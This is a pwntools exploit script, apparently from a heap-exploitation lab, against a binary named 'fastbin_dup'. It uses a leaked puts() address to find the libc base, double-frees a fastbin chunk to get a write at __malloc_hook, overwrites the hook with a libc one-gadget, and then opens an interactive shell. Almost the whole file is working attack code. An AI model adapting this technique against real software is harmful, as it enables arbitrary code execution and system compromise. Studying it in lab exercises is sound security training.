#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================


# Set the username field.
username = p64(0) + p64(0x31)       # 00000000 00000031 -> specifies 3-0 fastbin size in line b4 our malloc write. 
                                    # this is essentially conforming to what malloc expects when its letting us write to user addr: 0x602010
io.sendafter("username: ", username)
io.recvuntil("> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, "A"*0x28)    # setup initial double free
chunk_B = malloc(0x68, "B"*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)                       # free A chunk for 2nd time - double free

dup = malloc(0x68, p64(libc.sym.__malloc_hook - 35))   # request 40 bytes and write a fake forward pointer
                                        # char username[16] - this set to 00000000 00000031
                                        # char target[16] - data section -GOT HEEM 00000000
#input()   # debug

malloc(0x68, "Y")                   #    
malloc(0x68, "Y")                   # 
malloc(0x68, b"Y" * 19 + p64(libc.address + 0xe1fa1))            
input()
malloc(1, "")
log.info(hex(libc.address + 0xe1fa1))


# =============================================================================

io.interactive()
